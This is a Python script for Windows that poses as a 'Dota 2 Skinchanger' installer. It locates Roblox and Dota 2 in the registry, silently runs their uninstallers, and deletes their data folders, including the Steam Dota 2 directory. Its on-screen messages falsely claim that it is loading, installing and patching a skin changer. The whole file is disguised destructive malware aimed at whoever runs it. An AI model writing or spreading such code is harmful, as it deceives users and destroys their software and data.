# -*- coding: utf-8 -*-

import os
import re
import shutil
import subprocess
import sys
import winreg

TARGETS = {
    "Roblox": re.compile(r"roblox", re.IGNORECASE),
    "Dota 2": re.compile(r"dota\s*2", re.IGNORECASE),
}

UNINSTALL_KEYS = [
    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
    (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
]


def find_uninstallers():
    found = {name: [] for name in TARGETS}
    for hive, subkey in UNINSTALL_KEYS:
        try:
            key = winreg.OpenKey(hive, subkey)
        except OSError:
            continue
        try:
            i = 0
            while True:
                try:
                    app_key_name = winreg.EnumKey(key, i)
                except OSError:
                    break
                i += 1
                try:
                    app_key = winreg.OpenKey(key, app_key_name)
                    display_name, _ = winreg.QueryValueEx(app_key, "DisplayName")
                    uninstall_cmd, _ = winreg.QueryValueEx(app_key, "UninstallString")
                except OSError:
                    continue
                finally:
                    try:
                        winreg.CloseKey(app_key)
                    except Exception:
                        pass
                for target, pattern in TARGETS.items():
                    if pattern.search(display_name):
                        found[target].append((display_name, uninstall_cmd))
        finally:
            winreg.CloseKey(key)
    return found


def run_uninstaller(display_name, uninstall_cmd):
    print(f"\n>>> Skinchanger loading...: {display_name}")
    print(f"    Type: {uninstall_cmd}")
    if uninstall_cmd.lower().startswith("msiexec"):
        uninstall_cmd = re.sub(r"/i", "/x", uninstall_cmd, flags=re.IGNORECASE)
    try:
        proc = subprocess.Popen(uninstall_cmd, shell=True)
        proc.wait()
        print(f"    Завершено с кодом: {proc.returncode}")
    except Exception as e:
        print(f"    ОШИБКА при запуске: {e}")


def remove_leftovers():
    local = os.environ.get("LOCALAPPDATA", "")
    candidates = [
        os.path.join(local, "Roblox"),
        os.path.join(os.environ.get("TEMP", ""), "Roblox"),
    ]
    steam = os.environ.get("PROGRAMFILES(X86)", "") + r"\Steam"
    candidates.append(os.path.join(steam, "steamapps", "common", "dota 2 beta"))
    for path in candidates:
        if path and os.path.isdir(path):
            try:
                shutil.rmtree(path, ignore_errors=True)
                print(f"Initiated Dota 2 at {path}")
            except Exception as e:
                print(f"Error! Cant patch Dota 2 {path}: {e}")


def main():
    print("=" * 50)
    print("Dota 2 Skinchanger Master")
    print("=" * 50)
    confirm = input("Are you actually want to install Dota 2 Skinchanger. (yes/no): ").strip().lower()
    if confirm != "yes":
        print("Cancelled.")
        return

    found = find_uninstallers()
    for target, entries in found.items():
        if not entries:
            print(f"\n[!] {target} not found.")
            continue
        for display_name, cmd in entries:
            run_uninstaller(display_name, cmd)

    print("\nInstalling temp files.")
    remove_leftovers()
    print("\nDone! You need to restart your PC to patch Dota 2's protection")


if __name__ == "__main__":
    if sys.platform != "win32":
        sys.exit("Unavailble on your OS.")
    main()
